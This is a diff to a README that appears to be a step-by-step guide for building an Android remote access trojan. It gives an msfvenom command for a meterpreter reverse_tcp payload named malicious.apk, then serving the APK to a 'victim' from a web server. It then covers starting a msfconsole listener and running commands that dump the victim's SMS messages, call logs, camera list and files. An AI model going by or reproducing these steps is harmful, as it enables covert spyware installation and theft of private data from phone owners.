@@ -39,16 +39,20 @@ A Guide for making you own RAT(Remote access tool) for android with the help of 
 
 9. We are using msfvenom for creating payload.
     (msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> R > malicious.apk).
-   
+   ![Screenshot 2025-01-02 191802](https://github.com/user-attachments/assets/3e9ed813-a821-4079-b78f-e03817f94de2)
+
 10. LHOST: Your IP address (use ifconfig to find it).  
      LPORT: A port number for listening (e.g., 4444).  
      malicious.apk: The name of the APK file created.
+![Screenshot 2025-01-02 191825](https://github.com/user-attachments/assets/26b29ecf-5f1e-451c-83f4-61132521c0ab)
 
 11. After creating apk you can upload it to you server show that anyone with you link can download or you can share apk any way to victim device.
 
     (mv malicious.apk /var/www/html/) for moving apk to server.
 
 12. Now open msfconsole to monitro the apk and perform task on it on victim device.
+![Screenshot 2025-01-02 193021](https://github.com/user-attachments/assets/192ce1fd-543d-4fc8-add0-7d01b71a9550)
+![Screenshot 2025-01-02 193046](https://github.com/user-attachments/assets/d072d315-4dfc-49c9-9d1e-21bdd957e387)
 
 # Steps to connect to the paylod in victim device
 
@@ -65,7 +69,14 @@ set LPORT {port}
 exploit
 
 13. Hit enter to exploit make sure you have successfully install the payload to the victim device.
+![Screenshot 2025-01-02 193214](https://github.com/user-attachments/assets/34c56c34-e7d3-4306-891c-24bbdea74026)
 
 14. It will get connect to victim device now you can have access to it file manager,sms,calllogs,sysinfo,camer,etc.
+![Screenshot 2025-01-02 193448](https://github.com/user-attachments/assets/82ba145d-a55d-4233-a6d7-54962bff0814)
+![Screenshot 2025-01-02 193458](https://github.com/user-attachments/assets/942e9f88-17c3-4501-af78-e9713cbc193c)
 
 15. once connection is successfull try using (dump_sms for sms ,dump_calllog for call logs ,webcam_list , sysinfo for system info, ls to list dir)
+![Screenshot 2025-01-02 193517](https://github.com/user-attachments/assets/c42653cf-0695-4f88-8549-3041b24862b4)
+![Screenshot 2025-01-02 193535](https://github.com/user-attachments/assets/babd95e8-5496-4bac-bb62-8ab251baf7e2)
+# Sms output
+![Screenshot 2025-01-02 204049](https://github.com/user-attachments/assets/b0c6d2cd-8ae0-4946-b9fc-f0a42fc0cdf2)
